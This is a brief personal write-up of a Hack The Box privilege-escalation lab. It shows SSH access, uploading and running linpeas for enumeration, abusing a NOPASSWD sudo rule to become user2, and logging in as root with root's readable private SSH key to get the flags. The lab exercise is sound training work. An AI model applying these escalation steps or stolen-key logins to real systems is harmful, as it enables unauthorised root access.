#HackTheBox 
# 1.Reconnaissance
Connection ssh -p 30751 user1@134.122.103.40
use2 existe
	
# 2.Enumération
. send linpeas.sh script for first ssh connexion
	commande : 
	"scp -P 30751 /home/kali/Desktop/HTB_PrivEsc/linpeas.sh   user1@134.122.103.40:/home/user1/"
. add  all autorizations on linpeas.sh file for u-g-o
. execute linpeas.sh
## 2.1 Find
Sudo version 1.8.31  
	Potentially Vulnerable to CVE-2022-0847                                                                                                                      
	Potentially Vulnerable to CVE-2022-2588
	
User user1 may run the following commands on gettingstartedprivesc-707492-857d9545d5-94pt4:
    (user2 : user2) NOPASSWD: /bin/bash

# 3.Exploit
## 3.1 PrivEsc
execute commande : user1$ sudo -u user2 /bin/bash
User2 privilege and /user2/flag.txt get 
Execute commande : user2$ ./linpeas.sh
##             Find
	root's ssh private key is read by user2

SSH connexion on target with id_rsa's root : done
	"ssh -p 30751 root@134.122.103.40 -i id_rsa"

ROOT privilege and /root/flag.txt get 

